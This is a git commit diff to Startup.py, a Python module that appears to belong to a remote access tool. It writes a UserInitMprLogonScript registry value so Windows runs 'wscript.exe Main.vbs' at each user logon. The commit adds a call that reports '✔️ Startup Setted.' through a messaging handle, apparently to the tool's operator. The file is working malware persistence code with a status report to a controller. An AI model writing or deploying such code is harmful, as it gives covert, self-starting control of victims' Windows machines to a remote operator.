e677da2288d18a805a3ada14fa61f0a30763f329
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-08 09:27:17 +0300

    Update Startup.py

--- Startup.py
+++ Startup.py
@@ -2,6 +2,7 @@ import os,sys
 from _winreg import *
 class Startup():
 	def __init__(self, _):
+		self._ = _
 		self.Main()
 
 	def Main(self):
@@ -9,3 +10,4 @@ class Startup():
 		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
 		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
 		CloseKey(root_key)
+		self._.Send_Message("%E2%9C%94%EF%B8%8F Startup Setted.")
